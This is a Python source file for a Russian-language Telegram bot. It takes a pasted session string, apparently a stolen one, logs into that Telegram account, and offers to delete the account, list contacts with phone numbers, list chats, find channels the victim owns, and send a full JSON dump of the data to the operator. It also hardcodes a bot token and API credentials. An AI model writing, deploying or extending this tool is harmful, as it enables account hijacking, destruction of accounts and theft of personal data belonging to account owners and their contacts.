# sessionbot.py
import os, asyncio, time, requests, json, datetime, re, threading, sys
from telethon import TelegramClient, errors, events
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdateProfileRequest, DeleteAccountRequest, UpdateUsernameRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.tl.types import InputFile
from flask import Flask, request, jsonify
from flask_cors import CORS
import logging

logging.getLogger('telethon').setLevel(logging.ERROR)

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8745776458:AAGTvCw4MTDmACckKEleBlo8ue0m9PmT5EQ")

sessions = {}
clients = {}
user_data = {}

def get_progress_bar(percent, length=25):
    filled = int(length * percent / 100)
    bar = '█' * filled + '░' * (length - filled)
    return f"[{bar}] {percent}%"

async def validate_session(session_str):
    try:
        client = TelegramClient(StringSession(session_str), 39328144, "b4c02b2f6297f1b61d3073fd50629711")
        await client.connect()
        if await client.is_user_authorized():
            me = await client.get_me()
            return {
                'valid': True,
                'id': me.id,
                'first_name': me.first_name,
                'username': f"@{me.username}" if me.username else 'Нет',
                'phone': me.phone
            }
        return {'valid': False, 'reason': 'Сессия недействительна'}
    except Exception as e:
        return {'valid': False, 'reason': str(e)[:100]}

async def get_contacts(client):
    contacts = []
    try:
        result = await client(GetContactsRequest(hash=0))
        for user in result.users:
            if user.contact:
                name = f"{user.first_name or ''} {user.last_name or ''}".strip() or 'Без имени'
                contacts.append({
                    'name': name,
                    'phone': user.phone if hasattr(user, 'phone') and user.phone else 'Нет',
                    'username': f"@{user.username}" if hasattr(user, 'username') and user.username else 'Нет',
                    'id': user.id
                })
    except:
        pass
    return contacts

async def get_dialogs(client):
    dialogs = []
    try:
        async for dialog in client.iter_dialogs():
            if dialog.is_user:
                dialogs.append({
                    'name': dialog.name or 'Без имени',
                    'id': dialog.id,
                    'unread_count': dialog.unread_count
                })
    except:
        pass
    return dialogs[:50]

async def get_owner_channels(client):
    channels = []
    try:
        async for dialog in client.iter_dialogs():
            if dialog.is_channel or dialog.is_group:
                try:
                    full = await client(GetFullChannelRequest(dialog.entity))
                    if full and hasattr(full, 'full_chat'):
                        if hasattr(full.full_chat, 'creator') and full.full_chat.creator:
                            link = f"https://t.me/{dialog.entity.username}" if dialog.entity.username else f"https://t.me/c/{dialog.id}"
                            channels.append({
                                'name': dialog.name,
                                'id': dialog.id,
                                'link': link,
                                'members': full.full_chat.participants_count if hasattr(full.full_chat, 'participants_count') else 'Неизвестно'
                            })
                except:
                    pass
    except:
        pass
    return channels

async def get_full_dump(client):
    me = await client.get_me()
    contacts = await get_contacts(client)
    dialogs = await get_dialogs(client)
    channels = await get_owner_channels(client)
    
    dump = {
        'account': {
            'id': me.id,
            'first_name': me.first_name,
            'last_name': me.last_name or '',
            'username': f"@{me.username}" if me.username else 'Нет',
            'phone': me.phone,
            'date': datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')
        },
        'contacts': contacts,
        'dialogs': dialogs,
        'channels': channels
    }
    return dump

def send_message(chat_id, text, reply_markup=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {'chat_id': chat_id, 'text': text}
        if reply_markup:
            payload['reply_markup'] = json.dumps(reply_markup)
        requests.post(url, data=payload, timeout=10)
    except:
        pass

def edit_message(chat_id, message_id, text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        payload = {'chat_id': chat_id, 'message_id': message_id, 'text': text}
        requests.post(url, data=payload, timeout=10)
    except:
        pass

def answer_callback(callback_id, text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
        payload = {'callback_query_id': callback_id, 'text': text}
        requests.post(url, data=payload, timeout=10)
    except:
        pass

async def send_menu(chat_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "🗑 Удалить аккаунт", "callback_data": "delete_account"}],
            [{"text": "📋 Контакты", "callback_data": "contacts"}],
            [{"text": "💬 Диалоги", "callback_data": "dialogs"}],
            [{"text": "📢 Скан каналов", "callback_data": "channels"}],
            [{"text": "💾 Дамп аккаунта", "callback_data": "dump"}],
            [{"text": "🚪 Выйти", "callback_data": "logout"}]
        ]
    }
    send_message(chat_id, "📱 Управление аккаунтом:", reply_markup=keyboard)

@app.route('/')
def index():
    return jsonify({'status': 'Бот работает', 'users': len(sessions)})

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.json
    if not data:
        return jsonify({'status': 'error'}), 400
    
    if 'callback_query' in data:
        callback = data['callback_query']
        callback_id = callback['id']
        chat_id = callback['message']['chat']['id']
        message_id = callback['message']['message_id']
        data_callback = callback['data']
        asyncio.create_task(handle_callback(chat_id, message_id, callback_id, data_callback))
        return jsonify({'status': 'ok'})
    
    message = data.get('message', {})
    text = message.get('text', '')
    chat_id = message.get('chat', {}).get('id')
    
    if not chat_id:
        return jsonify({'status': 'error'}), 400
    
    if text == '/start':
        send_message(chat_id, "🔓 Введите session string для входа в аккаунт:")
        return jsonify({'status': 'ok'})
    
    if len(text) > 40 and not text.startswith('/'):
        asyncio.create_task(handle_session(chat_id, text))
        return jsonify({'status': 'ok'})
    
    return jsonify({'status': 'ok'})

async def handle_callback(chat_id, message_id, callback_id, data):
    if chat_id not in sessions:
        answer_callback(callback_id, "❌ Войдите в аккаунт")
        return
    
    client = clients.get(chat_id)
    if not client:
        answer_callback(callback_id, "❌ Ошибка подключения")
        return
    
    answer_callback(callback_id, "⏳ Выполняется...")
    
    if data == "delete_account":
        await handle_delete_account(chat_id, client, message_id)
    elif data == "contacts":
        await handle_contacts(chat_id, client, message_id)
    elif data == "dialogs":
        await handle_dialogs(chat_id, client, message_id)
    elif data == "channels":
        await handle_channels(chat_id, client, message_id)
    elif data == "dump":
        await handle_dump(chat_id, client, message_id)
    elif data == "logout":
        if chat_id in sessions:
            del sessions[chat_id]
        if chat_id in clients:
            del clients[chat_id]
        edit_message(chat_id, message_id, "🚪 Вы вышли из аккаунта")

async def handle_session(chat_id, session_str):
    send_message(chat_id, "🔄 Проверка сессии...")
    result = await validate_session(session_str)
    
    if not result['valid']:
        send_message(chat_id, f"❌ Ошибка: {result['reason']}")
        send_message(chat_id, "🔓 Введите новую session string:")
        return
    
    sessions[chat_id] = session_str
    
    try:
        client = TelegramClient(StringSession(session_str), 39328144, "b4c02b2f6297f1b61d3073fd50629711")
        await client.connect()
        clients[chat_id] = client
        me = await client.get_me()
    except Exception as e:
        send_message(chat_id, f"❌ Ошибка: {e}")
        return
    
    info = f"""✅ УСПЕШНАЯ АВТОРИЗАЦИЯ!
👤 Имя: {me.first_name}
🆔 ID: {me.id}
👤 Юзернейм: @{me.username if me.username else 'Нет'}
📱 Номер: {me.phone}"""
    send_message(chat_id, info)
    await send_menu(chat_id)

async def handle_delete_account(chat_id, client, message_id):
    for i in range(10, 101, 10):
        edit_message(chat_id, message_id, f"🗑 Удаление...\n\n{get_progress_bar(i)}")
        await asyncio.sleep(0.3)
    try:
        await client(DeleteAccountRequest(reason="user_request"))
        edit_message(chat_id, message_id, "✅ Аккаунт удалён!")
        if chat_id in sessions:
            del sessions[chat_id]
        if chat_id in clients:
            del clients[chat_id]
    except Exception as e:
        edit_message(chat_id, message_id, f"❌ Ошибка: {e}")

async def handle_contacts(chat_id, client, message_id):
    for i in range(10, 101, 10):
        edit_message(chat_id, message_id, f"📋 Загрузка...\n\n{get_progress_bar(i)}")
        await asyncio.sleep(0.2)
    try:
        contacts = await get_contacts(client)
        if not contacts:
            edit_message(chat_id, message_id, "📋 Контактов нет")
            return
        text = "📋 КОНТАКТЫ\n\n"
        for c in contacts[:20]:
            text += f"👤 {c['name']}\n🆔 {c['id']}\n📱 {c['phone']}\n👤 {c['username']}\n\n"
        if len(contacts) > 20:
            text += f"... и ещё {len(contacts)-20}"
        edit_message(chat_id, message_id, text)
    except Exception as e:
        edit_message(chat_id, message_id, f"❌ Ошибка: {e}")

async def handle_dialogs(chat_id, client, message_id):
    for i in range(10, 101, 10):
        edit_message(chat_id, message_id, f"💬 Загрузка...\n\n{get_progress_bar(i)}")
        await asyncio.sleep(0.2)
    try:
        dialogs = await get_dialogs(client)
        if not dialogs:
            edit_message(chat_id, message_id, "💬 Диалогов нет")
            return
        text = "💬 ДИАЛОГИ (50)\n\n"
        for d in dialogs:
            text += f"👤 {d['name']}\n🆔 {d['id']}\n📩 Непрочитанных: {d['unread_count']}\n\n"
        edit_message(chat_id, message_id, text)
    except Exception as e:
        edit_message(chat_id, message_id, f"❌ Ошибка: {e}")

async def handle_channels(chat_id, client, message_id):
    for i in range(10, 101, 10):
        edit_message(chat_id, message_id, f"📢 Сканирование...\n\n{get_progress_bar(i)}")
        await asyncio.sleep(0.2)
    try:
        channels = await get_owner_channels(client)
        if not channels:
            edit_message(chat_id, message_id, "📢 Вы не овнер ни одного канала")
            return
        text = "📢 КАНАЛЫ (ОВНЕР)\n\n"
        for ch in channels:
            text += f"📝 {ch['name']}\n🔗 {ch['link']}\n👥 {ch['members']}\n\n"
        edit_message(chat_id, message_id, text)
    except Exception as e:
        edit_message(chat_id, message_id, f"❌ Ошибка: {e}")

async def handle_dump(chat_id, client, message_id):
    for i in range(10, 101, 10):
        edit_message(chat_id, message_id, f"💾 Создание дампа...\n\n{get_progress_bar(i)}")
        await asyncio.sleep(0.3)
    try:
        dump = await get_full_dump(client)
        filename = f"dump_{chat_id}_{int(time.time())}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(dump, f, indent=2, ensure_ascii=False)
        edit_message(chat_id, message_id, "✅ Дамп создан! Отправляю...")
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(filename, 'rb') as f:
            requests.post(url, data={'chat_id': chat_id, 'caption': '💾 ДАМП'}, files={'document': f}, timeout=30)
        os.remove(filename)
    except Exception as e:
        edit_message(chat_id, message_id, f"❌ Ошибка: {e}")

@app.route('/setwebhook', methods=['GET'])
def set_webhook():
    webhook_url = os.environ.get("WEBHOOK_URL", "https://your-app.onrender.com/webhook")
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
    return jsonify(requests.get(url).json())

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
